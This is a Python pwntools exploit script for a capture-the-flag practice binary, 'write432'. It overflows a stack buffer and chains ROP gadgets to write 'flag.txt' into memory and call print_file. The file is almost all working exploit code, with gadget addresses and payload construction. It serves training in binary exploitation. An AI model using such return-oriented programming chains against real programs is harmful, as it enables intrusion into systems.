#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template write432
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('write432')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  '.'

io = start()

"""
0x080485aa: pop edi; pop ebp; ret; 
0x0804839d: pop ebx; ret; 
write-what-where gadget 0x08048543: mov dword ptr [edi], ebp; ret; 

Attack:
pop some addr of dss in edi, pop flag in EBP, call www gadget, do it again for .txt, then call print_file
"""

print_file = p32(0x80483d0)
dss_start = 0x0804a018+0x20  # dont pop at the start of Data segment (based on the size of section we chose dss)
pop_edi_ebp = p32(0x080485aa)
www_gadget = p32(0x08048543)
pop_ret = p32(0x0804839d)

# print(exe.symbols)

buf = ""
buf += "A"*44
buf += pop_edi_ebp
buf += p32(dss_start)
buf += "flag"
buf += www_gadget
buf += pop_edi_ebp
buf += p32(dss_start+4)
buf += ".txt"
buf += www_gadget

# calling print_file("flag.txt")

buf += print_file
buf += pop_ret
buf += p32(dss_start)

write('in.txt', buf)
#print(buf)

io.sendline(buf)
io.interactive()

